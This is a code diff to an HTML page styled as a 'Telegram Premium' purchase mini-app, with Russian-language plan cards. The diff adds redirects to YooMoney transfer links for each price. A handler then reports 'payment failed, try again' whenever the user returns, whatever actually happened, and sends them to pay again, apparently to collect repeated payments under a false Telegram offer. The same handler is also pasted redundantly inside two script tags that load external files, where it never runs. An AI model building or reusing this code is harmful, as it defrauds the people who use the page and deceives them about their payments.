@@ -4,19 +4,99 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Telegram Premium</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js">
+        // Handle returning to page after payment attempt
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden && sessionStorage.getItem('paymentInProgress') === 'true') {
+                // User returned from payment
+                sessionStorage.removeItem('paymentInProgress');
+
+                const payBtn = document.getElementById('payBtn');
+                const savedPlan = sessionStorage.getItem('paymentPlan');
+
+                if (savedPlan) {
+                    selectedPlan = JSON.parse(savedPlan);
+                }
+
+                // Show error state
+                payBtn.innerHTML = 'Оплата не прошла, попробуйте повторить';
+                payBtn.classList.add('payment-failed');
+                payBtn.disabled = false;
+
+                // Allow retry - clicking will redirect again
+                payBtn.onclick = function(e) {
+                    e.stopPropagation();
+
+                    const paymentUrls = {
+                        '149': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313731365f63373737646635313063353236313135376139613434623635353130613630373963656137363062',
+                        '447': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313735345f37353830646663303961626633353031376539303334316165383834303061646534386263623566',
+                        '960': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313735395f32623362373133613235346262373931646533656437653063373135616432313038353966323038'
+                    };
+
+                    const url = paymentUrls[selectedPlan.price];
+                    if (url) {
+                        window.open(url, '_blank');
+                        sessionStorage.setItem('paymentInProgress', 'true');
+                        sessionStorage.setItem('paymentPlan', JSON.stringify(selectedPlan));
+
+                        // Reset to spinner state
+                        this.disabled = true;
+                        this.classList.remove('payment-failed');
+                        this.innerHTML = '<span class="btn-spinner"></span> Оплата...';
+                    }
+                };
+            }
+        });
+</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js">
+        // Handle returning to page after payment attempt
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden && sessionStorage.getItem('paymentInProgress') === 'true') {
+                // User returned from payment
+                sessionStorage.removeItem('paymentInProgress');
+
+                const payBtn = document.getElementById('payBtn');
+                const savedPlan = sessionStorage.getItem('paymentPlan');
+
+                if (savedPlan) {
+                    selectedPlan = JSON.parse(savedPlan);
+                }
+
+                // Show error state
+                payBtn.innerHTML = 'Оплата не прошла, попробуйте повторить';
+                payBtn.classList.add('payment-failed');
+                payBtn.disabled = false;
+
+                // Allow retry - clicking will redirect again
+                payBtn.onclick = function(e) {
+                    e.stopPropagation();
+
+                    const paymentUrls = {
+                        '149': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313731365f63373737646635313063353236313135376139613434623635353130613630373963656137363062',
+                        '447': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313735345f37353830646663303961626633353031376539303334316165383834303061646534386263623566',
+                        '960': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313735395f32623362373133613235346262373931646533656437653063373135616432313038353966323038'
+                    };
+
+                    const url = paymentUrls[selectedPlan.price];
+                    if (url) {
+                        window.open(url, '_blank');
+                        sessionStorage.setItem('paymentInProgress', 'true');
+                        sessionStorage.setItem('paymentPlan', JSON.stringify(selectedPlan));
+
+                        // Reset to spinner state
+                        this.disabled = true;
+                        this.classList.remove('payment-failed');
+                        this.innerHTML = '<span class="btn-spinner"></span> Оплата...';
+                    }
+                };
+            }
+        });
+</script>
     <style>
-@font-face {
-    font-family: 'KR';
-    src: url('font.woff2') format('woff2');
-}
         * {
-            font-family: 'KR';
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none;
         }
 
         :root {
@@ -34,6 +114,7 @@
         }
 
         body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: var(--bg-primary);
             color: var(--text-primary);
             min-height: 100vh;
@@ -515,7 +596,29 @@
             .pay-button { padding-bottom: calc(16px + env(safe-area-inset-bottom)); }
             .container { padding-bottom: calc(100px + env(safe-area-inset-bottom)); }
         }
-    </style>
+    
+        .btn-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        .pay-btn.payment-failed {
+            background: #ff3b30 !important;
+            color: white !important;
+            cursor: pointer !important;
+        }
+
+        .pay-btn.payment-failed:hover {
+            background: #ff453a !important;
+        }
+</style>
 </head>
 <body>
     <!-- Preloader -->
@@ -544,7 +647,7 @@
             </div>
 
             <div class="plan-wrapper has-discount">
-                <div class="plan-badge">-42%</div>
+                <div class="plan-badge">-0%</div>
                 <div class="plan-card" data-plan="3" data-price="447" data-discount="0">
                     <div class="plan-lottie" id="lottie3"></div>
                     <div class="plan-duration">3 месяца</div>
@@ -554,7 +657,7 @@
             </div>
 
             <div class="plan-wrapper has-discount">
-                <div class="plan-badge">-66%</div>
+                <div class="plan-badge">-46%</div>
                 <div class="plan-card" data-plan="12" data-price="960" data-discount="46">
                     <div class="plan-lottie" id="lottie12"></div>
                     <div class="plan-duration">12 месяцев</div>
@@ -769,6 +872,8 @@
 
         payBtn.addEventListener('click', function(e) {
             if (!this.classList.contains('active')) return;
+
+            // Create ripple effect
             const rect = this.getBoundingClientRect();
             const ripple = document.createElement('span');
             const size = Math.max(rect.width, rect.height);
@@ -781,11 +886,28 @@
             this.appendChild(ripple);
             setTimeout(() => ripple.remove(), 600);
 
-            tg.showConfirm('Подтвердите оплату', `Оформить подписку Premium на ${selectedPlan.duration} ${selectedPlan.duration === '1' ? 'месяц' : selectedPlan.duration === '3' ? 'месяца' : 'месяцев'}?`, (confirmed) => {
-                if (confirmed) {
-                    tg.showAlert('Оплата прошла успешно! ✅');
-                }
-            });
+            // Disable button and show spinner
+            this.disabled = true;
+            this.classList.remove('active');
+            this.dataset.originalText = this.textContent;
+            this.innerHTML = '<span class="btn-spinner"></span> Оплата...';
+
+            // Map prices to payment URLs
+            const paymentUrls = {
+                '149': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313731365f63373737646635313063353236313135376139613434623635353130613630373963656137363062',
+                '447': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313735345f37353830646663303961626633353031376539303334316165383834303061646534386263623566',
+                '960': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313735395f32623362373133613235346262373931646533656437653063373135616432313038353966323038'
+            };
+
+            const url = paymentUrls[selectedPlan.price];
+            if (url) {
+                // Open payment in new tab
+                window.open(url, '_blank');
+
+                // Store payment state
+                sessionStorage.setItem('paymentInProgress', 'true');
+                sessionStorage.setItem('paymentPlan', JSON.stringify(selectedPlan));
+            }
         });
 
         function createSparkles(element) {
@@ -827,6 +949,49 @@
         tg.onEvent('viewportChanged', () => {
             tg.expand();
         });
-    </script>
+    
+        // Handle returning to page after payment attempt
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden && sessionStorage.getItem('paymentInProgress') === 'true') {
+                // User returned from payment
+                sessionStorage.removeItem('paymentInProgress');
+
+                const payBtn = document.getElementById('payBtn');
+                const savedPlan = sessionStorage.getItem('paymentPlan');
+
+                if (savedPlan) {
+                    selectedPlan = JSON.parse(savedPlan);
+                }
+
+                // Show error state
+                payBtn.innerHTML = 'Оплата не прошла, попробуйте повторить';
+                payBtn.classList.add('payment-failed');
+                payBtn.disabled = false;
+
+                // Allow retry - clicking will redirect again
+                payBtn.onclick = function(e) {
+                    e.stopPropagation();
+
+                    const paymentUrls = {
+                        '149': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313731365f63373737646635313063353236313135376139613434623635353130613630373963656137363062',
+                        '447': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313735345f37353830646663303961626633353031376539303334316165383834303061646534386263623566',
+                        '960': 'https://yoomoney.ru/transfer/quickpay?requestId=353637363438313735395f32623362373133613235346262373931646533656437653063373135616432313038353966323038'
+                    };
+
+                    const url = paymentUrls[selectedPlan.price];
+                    if (url) {
+                        window.open(url, '_blank');
+                        sessionStorage.setItem('paymentInProgress', 'true');
+                        sessionStorage.setItem('paymentPlan', JSON.stringify(selectedPlan));
+
+                        // Reset to spinner state
+                        this.disabled = true;
+                        this.classList.remove('payment-failed');
+                        this.innerHTML = '<span class="btn-spinner"></span> Оплата...';
+                    }
+                };
+            }
+        });
+</script>
 </body>
 </html>
